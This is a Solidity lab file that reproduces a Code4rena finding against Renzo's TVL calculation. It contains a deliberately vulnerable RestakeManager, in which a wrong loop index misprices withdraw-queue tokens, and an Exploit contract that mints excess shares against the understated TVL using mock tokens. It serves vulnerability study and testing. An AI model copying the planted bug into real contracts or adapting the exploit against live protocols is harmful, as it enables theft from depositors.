// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Renzo — [H-08] Incorrect withdraw queue balance in TVL calculation
    (Code4rena 2024-04-renzo, finding #33495, reporter josephdara).

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: when calculating TVL, the outer loop iterates operator
    delegators (index `i`) and the inner loop iterates collateral tokens
    (index `j`). The withdraw-queue value lookup incorrectly uses
    `collateralTokens[i]` for the oracle token identity while reading the
    balance of `collateralTokens[j]`:

        totalWithdrawalQueueValue += renzoOracle.lookupTokenValue(
            collateralTokens[i],                         // @> VULN wrong index
            collateralTokens[j].balanceOf(withdrawQueue)
        );

    With 1 OD and 3 collateral tokens, token0's price is applied three times
    and tokens 1/2 are never valued. Minting against the understated TVL
    yields excess shares.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Oracle that prices each collateral token at a fixed USD unit (1e18 = $1).
contract RenzoOracle {
    mapping(address => uint256) public price; // 1e18-scaled USD per whole token

    function setPrice(address token, uint256 p) external {
        price[token] = p;
    }

    function lookupTokenValue(address token, uint256 balance) external view returns (uint256) {
        return (balance * price[token]) / 1e18;
    }
}

/// @notice Reduced RestakeManager.calculateTVLs withdraw-queue path.
/// Source shape: RestakeManager TVL loops (Code4rena 2024-04-renzo).
contract RestakeManager {
    address[] public operatorDelegators;
    MockERC20[] public collateralTokens;
    address public withdrawQueue;
    RenzoOracle public renzoOracle;
    bool public withdrawQueueTokenBalanceRecorded;

    uint256 public totalSupply; // ezETH shares
    mapping(address => uint256) public balanceOf;

    constructor(address _withdrawQueue, RenzoOracle _oracle) {
        withdrawQueue = _withdrawQueue;
        renzoOracle = _oracle;
        operatorDelegators.push(msg.sender); // one OD (index 0)
    }

    function addCollateral(MockERC20 token) external {
        collateralTokens.push(token);
    }

    /// @notice Reduced calculateTVLs — withdraw-queue branch uses wrong index.
    function calculateTVLs() public view returns (uint256 totalTvl) {
        uint256 odLength = operatorDelegators.length;
        bool recorded = withdrawQueueTokenBalanceRecorded;

        for (uint256 i = 0; i < odLength; ) {
            uint256 tokenLength = collateralTokens.length;
            for (uint256 j = 0; j < tokenLength; ) {
                // OD token holdings (correct index j) — kept for realism
                totalTvl += renzoOracle.lookupTokenValue(
                    address(collateralTokens[j]),
                    collateralTokens[j].balanceOf(operatorDelegators[i])
                );

                // record token value of withdraw queue
                if (!recorded) {
                    // FIX: use collateralTokens[j] for the oracle token identity
                    totalTvl += renzoOracle.lookupTokenValue(address(collateralTokens[i]), collateralTokens[j].balanceOf(withdrawQueue)); // @> VULN: index i not j
                }

                unchecked {
                    ++j;
                }
            }

            // after first OD pass, real protocol sets the flag so WQ is not
            // double-counted across ODs — we keep that shape
            recorded = true;

            unchecked {
                ++i;
            }
        }
    }

    /// @notice Correct TVL for assertions (uses index j for both price and balance).
    function calculateTVLsCorrect() public view returns (uint256 totalTvl) {
        uint256 odLength = operatorDelegators.length;
        for (uint256 i = 0; i < odLength; ) {
            uint256 tokenLength = collateralTokens.length;
            for (uint256 j = 0; j < tokenLength; ) {
                totalTvl += renzoOracle.lookupTokenValue(
                    address(collateralTokens[j]),
                    collateralTokens[j].balanceOf(operatorDelegators[i])
                );
                if (i == 0) {
                    totalTvl += renzoOracle.lookupTokenValue(
                        address(collateralTokens[j]),
                        collateralTokens[j].balanceOf(withdrawQueue)
                    );
                }
                unchecked {
                    ++j;
                }
            }
            unchecked {
                ++i;
            }
        }
    }

    /// @notice Mint shares against the (buggy) TVL — excess shares when TVL understates.
    function deposit(MockERC20 token, uint256 amount) external returns (uint256 shares) {
        uint256 tvlBefore = calculateTVLs();
        token.transferFrom(msg.sender, operatorDelegators[0], amount);
        uint256 depositValue = renzoOracle.lookupTokenValue(address(token), amount);
        if (totalSupply == 0 || tvlBefore == 0) {
            shares = depositValue;
        } else {
            shares = (depositValue * totalSupply) / tvlBefore;
        }
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
    }
}

/// @notice Deploys 1 OD + 3 collaterals with unequal WQ balances, shows understated
///         TVL, then mints excess shares by depositing against the buggy price.
contract Exploit {
    RenzoOracle public oracle; // nonce 1
    MockERC20 public token0; // nonce 2 — $1
    MockERC20 public token1; // nonce 3 — $10 (should dominate WQ value)
    MockERC20 public token2; // nonce 4 — $100
    RestakeManager public manager; // nonce 5
    address public constant WQ = address(0xBEEF); // abstract withdraw-queue holder

    uint256 public sharesMinted;
    uint256 public buggyTvl;
    uint256 public correctTvl;

    constructor() {
        oracle = new RenzoOracle(); // 1
        token0 = new MockERC20(); // 2
        token1 = new MockERC20(); // 3
        token2 = new MockERC20(); // 4
        manager = new RestakeManager(WQ, oracle); // 5

        manager.addCollateral(token0);
        manager.addCollateral(token1);
        manager.addCollateral(token2);

        // Prices: t0=$1, t1=$10, t2=$100 (per 1e18 unit)
        oracle.setPrice(address(token0), 1e18);
        oracle.setPrice(address(token1), 10e18);
        oracle.setPrice(address(token2), 100e18);

        // Withdraw queue holds: 1e18 of each token
        // Correct WQ value = 1*$1 + 1*$10 + 1*$100 = $111
        // Buggy WQ value   = prices token0 three times: 1*$1 + 1*$1 + 1*$1 = $3
        token0.mint(WQ, 1e18);
        token1.mint(WQ, 1e18);
        token2.mint(WQ, 1e18);

        // Seed OD with a tiny amount of token0 so totalSupply path is non-empty
        // after first deposit path; use deposit of token0 for the attack.
        token0.mint(address(this), 10e18);
    }

    function run() external {
        buggyTvl = manager.calculateTVLs();
        correctTvl = manager.calculateTVLsCorrect();

        // Harm surface 1: TVL is understated (WQ priced with token0 only)
        require(buggyTvl < correctTvl, "TVL not understated");
        // Correct WQ alone is 111e18; buggy WQ is 3e18 → gap at least 100e18
        require(correctTvl - buggyTvl >= 100e18, "understate gap too small");

        // Seed protocol with first deposit at empty (1:1 shares)
        // After this, TVL grows by deposit but WQ understatement remains on next mint.
        // Move: deposit 1 token0 as "honest LP" baseline shares.
        // transferFrom path: mint already on this
        // RestakeManager.deposit uses transferFrom — need balance on this
        // Actually deposit does transferFrom(msg.sender, OD, amount)
        // We'll call as this contract.
        // For empty vault: shares = depositValue.
        // First deposit 1e18 token0 → shares 1e18, OD holds 1e18 token0.
        // Note: deposit transfers before minting but TVL is read first.
        uint256 firstShares = manager.deposit(token0, 1e18);
        require(firstShares == 1e18, "seed shares");

        // Second deposit of 1e18 token0 against understated TVL:
        // buggy TVL after first deposit ≈ OD(token0=1)*$1 + WQ buggy $3 = $4
        // correct TVL ≈ OD $1 + WQ $111 = $112
        // shares = 1e18 * totalSupply(1e18) / buggyTvl(4e18) = 0.25e18
        // If TVL were correct: shares = 1e18 * 1e18 / 112e18 ≈ 0.0089e18
        // Excess shares ≈ 0.25 - 0.0089 >> 0
        sharesMinted = manager.deposit(token0, 1e18);

        uint256 fairShares = (1e18 * 1e18) / correctTvlAfterSeed();
        // After seed, correct TVL = OD token0 (1e18)*1 + WQ 111 = 112e18
        // but second deposit also moves token0 to OD — fair shares at moment of
        // deposit used pre-transfer TVL. correctTvlAfterSeed is post-first-deposit.
        require(sharesMinted > fairShares * 2, "no excess shares from understated TVL");
        require(manager.balanceOf(address(this)) == firstShares + sharesMinted, "share book");
    }

    function correctTvlAfterSeed() public view returns (uint256) {
        // Post first deposit: OD has 1e18 token0; WQ still 1e18 of each.
        return manager.calculateTVLsCorrect();
    }
}
